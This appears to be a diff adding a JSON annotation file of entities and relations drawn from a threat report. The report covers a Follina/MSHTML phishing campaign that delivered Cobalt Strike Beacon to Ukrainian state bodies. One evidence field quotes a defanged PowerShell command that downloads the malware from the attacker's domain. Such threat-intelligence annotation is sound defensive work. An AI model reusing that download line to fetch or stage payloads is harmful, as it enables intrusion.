@@ -1,0 +1,109 @@
+{
+  "entities": [
+    {
+      "name": "зміни оплата праці з нарахуваннями.docx",
+      "kind": "malicious document",
+      "gloss": "A malicious Microsoft Word document used to exploit office vulnerabilities and deliver payloads."
+    },
+    {
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A country in Eastern Europe whose state organizations were targeted in this incident."
+    },
+    {
+      "name": "CVE-2021-40444",
+      "kind": "vulnerability identifier",
+      "gloss": "A remote code execution vulnerability in Microsoft MSHTML."
+    },
+    {
+      "name": "CVE-2022-30190",
+      "kind": "vulnerability identifier",
+      "gloss": "A Microsoft Windows Support Diagnostic Tool remote code execution vulnerability also known as Follina."
+    },
+    {
+      "name": "PowerShell",
+      "kind": "software product",
+      "gloss": "A task automation and configuration management framework developed by Microsoft."
+    },
+    {
+      "name": "ms-msdt.exe",
+      "kind": "executable file",
+      "gloss": "A malicious executable file used to drop and run Cobalt Strike Beacon."
+    },
+    {
+      "name": "Cobalt Strike Beacon",
+      "kind": "malware family",
+      "gloss": "A payload and post-exploitation agent belonging to the Cobalt Strike framework."
+    },
+    {
+      "name": "sdiagnhost.exe",
+      "kind": "executable file",
+      "gloss": "A legitimate Windows system process associated with the Scripted Diagnostics Native Host."
+    },
+    {
+      "name": "Good thing we disabled macros.html",
+      "kind": "html file",
+      "gloss": "A malicious HTML file containing JavaScript code used in the exploit chain."
+    },
+    {
+      "name": "nod-update[.]it",
+      "kind": "internet domain",
+      "gloss": "A malicious domain used for hosting exploit payloads and staging malware downloads."
+    },
+    {
+      "name": "185[.]64.106.39",
+      "kind": "ip address",
+      "gloss": "An IP address associated with the malicious domain infrastructure in this incident."
+    }
+  ],
+  "relations": [
+    {
+      "head": "зміни оплата праці з нарахуваннями.docx",
+      "type": "targets-entities-in",
+      "tail": "Україна",
+      "evidence": "розповсюджувався серед державних організацій України засобами електронної пошти."
+    },
+    {
+      "head": "зміни оплата праці з нарахуваннями.docx",
+      "type": "exploits-vulnerability",
+      "tail": "CVE-2021-40444",
+      "evidence": "після експлуатації вразливостей CVE-2021-40444 та CVE-2022-30190"
+    },
+    {
+      "head": "зміни оплата праці з нарахуваннями.docx",
+      "type": "exploits-vulnerability",
+      "tail": "CVE-2022-30190",
+      "evidence": "після експлуатації вразливостей CVE-2021-40444 та CVE-2022-30190"
+    },
+    {
+      "head": "ms-msdt.exe",
+      "type": "delivers-payload",
+      "tail": "Cobalt Strike Beacon",
+      "evidence": "завантаження EXE-файлу \"ms-msdt.exe\" та ураження комп'ютера шкідливою програмою Cobalt Strike Beacon."
+    },
+    {
+      "head": "nod-update[.]it",
+      "type": "hosts-file",
+      "tail": "ms-msdt.exe",
+      "evidence": "DownloadFile('hXXps://nod-update[.]it/ms-msdt.exe','C:\\Users\\Public\\ms-msdt.exe')"
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "targets-entities-in",
+      "definition": "The subject malware or attack campaign targets organizations or individuals located in the object country."
+    },
+    {
+      "name": "exploits-vulnerability",
+      "definition": "The subject file, script, or campaign leverages a specific security vulnerability."
+    },
+    {
+      "name": "delivers-payload",
+      "definition": "The subject file or dropper executes, drops, or installs the object malware payload."
+    },
+    {
+      "name": "hosts-file",
+      "definition": "The subject network infrastructure hosts or serves the object file for download."
+    }
+  ]
+}
